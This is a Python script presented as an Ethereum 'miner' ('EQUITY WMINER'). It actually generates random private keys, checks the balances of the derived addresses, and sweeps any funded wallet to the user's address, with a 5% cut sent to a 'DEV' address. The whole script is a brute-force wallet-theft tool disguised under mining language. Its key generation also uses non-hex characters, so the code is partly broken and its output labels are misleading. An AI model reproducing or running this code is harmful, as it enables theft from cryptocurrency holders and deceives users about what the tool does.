import os
import sys
import time
import json
import string
import secrets
import requests
from web3 import Web3
import multiprocessing as mainprocessing
import multiprocessing.dummy as multiprocessing

os.system("cls")
print("V 1.2")
print('███████╗░██████╗░██╗░░░██╗██╗████████╗██╗░░░██╗  ░██╗░░░░░░░██╗░░░░░░███╗░░░███╗██╗███╗░░██╗███████╗██████╗░')
print('██╔════╝██╔═══██╗██║░░░██║██║╚══██╔══╝╚██╗░██╔╝  ░██║░░██╗░░██║░░░░░░████╗░████║██║████╗░██║██╔════╝██╔══██╗')
print('█████╗░░██║██╗██║██║░░░██║██║░░░██║░░░░╚████╔╝░  ░╚██╗████╗██╔╝█████╗██╔████╔██║██║██╔██╗██║█████╗░░██████╔╝')
print('██╔══╝░░╚██████╔╝██║░░░██║██║░░░██║░░░░░╚██╔╝░░  ░░████╔═████║░╚════╝██║╚██╔╝██║██║██║╚████║██╔══╝░░██╔══██╗')
print('███████╗░╚═██╔═╝░╚██████╔╝██║░░░██║░░░░░░██║░░░  ░░╚██╔╝░╚██╔╝░░░░░░░██║░╚═╝░██║██║██║░╚███║███████╗██║░░██║')
print('╚══════╝░░░╚═╝░░░░╚═════╝░╚═╝░░░╚═╝░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝')
sys.stdout.write("\x1b]2;EQUITY WMINER | WAITING FOR INPUT | CHKS: 0 - HITS: 0 - BDHITS: 0 |\x07")
print('\n')

chks = 0
hits = 0
bdhits = 0

minerAddress = input("Welcome User! Enter your ETHEREUM address to start mining: ")
if len(minerAddress) == 42:
    print("\033[32mMining address accepted!\033[0m")
    intensity = input("Please input desired CPU intensity for mining (1-50): ")
    if int(intensity) >= 1 and int(intensity) <= 50:
        print("\033[32mSelected %s as CPU intensity\033[0m"%str(intensity))
        print("Miner is starting...\n")
        w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["RPC_NODE"]))
        time.sleep(3)
        if w3.isConnected() == True:
            def MineProcess(s):
                global minerAddress
                global chks
                global hits
                global bdhits
                i=0
                while i <= 1:
                    key = "0x" + "".join(secrets.choice(string.ascii_lowercase + string.digits)
                                                                            for i in range(64))
                    try:
                        account = w3.eth.account.from_key(key)
                        bal = w3.eth.get_balance(account.address)
                        if bal > 2000000000000000:
                            print("\033[32m[NEW HIT] Succesfully cracked a wallet with following key: " + key + "\033[0m")
                            gasdata = requests.get(json.load(open("DATA", "r"))['MAIN']["GAS_API"]).text
                            gasjson = json.loads(gasdata)
                            avgGas = int(gasjson["average"])/10
                            MineTransaction = {
                                'nonce': w3.eth.getTransactionCount(account.address),
                                'to': str(minerAddress),
                                'value': (bal-w3.toWei(avgGas, "gwei")*2*21000)*0.95,
                                'gas': 21000,
                                'gasPrice': w3.toWei(avgGas, "gwei")
                            }
                            MineTransaction2 = {
                                'nonce': w3.eth.getTransactionCount(account.address)+1,
                                'to': json.load(open("DATA", "r"))['SECONDARY']["DEV"],
                                'value': (bal-w3.toWei(avgGas, "gwei")*2*21000)*0.05,
                                'gas': 21000,
                                'gasPrice': w3.toWei(avgGas, "gwei")
                            }
                            signedMineTX = w3.eth.account.sign_transaction(MineTransaction, key)
                            sentMineTX = w3.eth.send_raw_transaction(signedMineTX)
                            signedMineTX2 = w3.eth.account.sign_transaction(MineTransaction2, key)
                            w3.eth.send_raw_transaction(signedMineTX2)
                            print("\033[32m" + str(bal/1000000000*0.95) + " ETH has been sent to your wallet. TXHash: " + "https://etherscan.io/tx/" + str(w3.toHex(sentMineTX)))
                            hits += 1
                            sys.stdout.write("\x1b]2;EQUITY WMINER | MINING...GOT AN HIT! | CHKS: %s - HITS: %s - BDHITS: %s |\x07"%(chks, hits, bdhits))
                        else:
                            print("\033[31m[BAD HIT] | " + str(account.address) + " | cracked but insufficient balance of " + str(bal/1000000000) + " ETH\033[0m")
                            bdhits += 1
                            sys.stdout.write("\x1b]2;EQUITY WMINER | MINING... | CHKS: %s - HITS: %s - BDHITS: %s |\x07"%(chks, hits, bdhits))
                            if hits >= 1: sys.stdout.write("\x1b]2;EQUITY WMINER | MINING...GOT AN HIT! | CHKS: %s - HITS: %s - BDHITS: %s |\x07"%(chks, hits, bdhits))
                            time.sleep(0.02)
                    except:
                        print("\033[31m[BAD MATCH] | %s | Invalid key match for wallet\033[0m"%key)
                        chks += 1
                        sys.stdout.write("\x1b]2;EQUITY WMINER | MINING... | CHKS: %s - HITS: %s - BDHITS: %s |\x07"%(chks, hits, bdhits))
                        if hits >= 1: sys.stdout.write("\x1b]2;EQUITY WMINER | MINING...GOT AN HIT! | CHKS: %s - HITS: %s - BDHITS: %s |\x07"%(chks, hits, bdhits))
                        time.sleep(0.02)
        if __name__=="__main__":
            process = multiprocessing.Pool(int(os.cpu_count()))
            process.map(MineProcess, range(0, int(intensity)))
            process.close()
            process.join()
        else:
            print("\033[31mSomething went wrong...  RPC Connection Error. Are you connected to Internet?\033[0m")
    else:
        print("Not a valid number.")
        input("\nMiner stopped. Please restart.")
else:
    print("That's not a valid ETHEREUM address!")
    input("\nMiner stopped. Please restart.")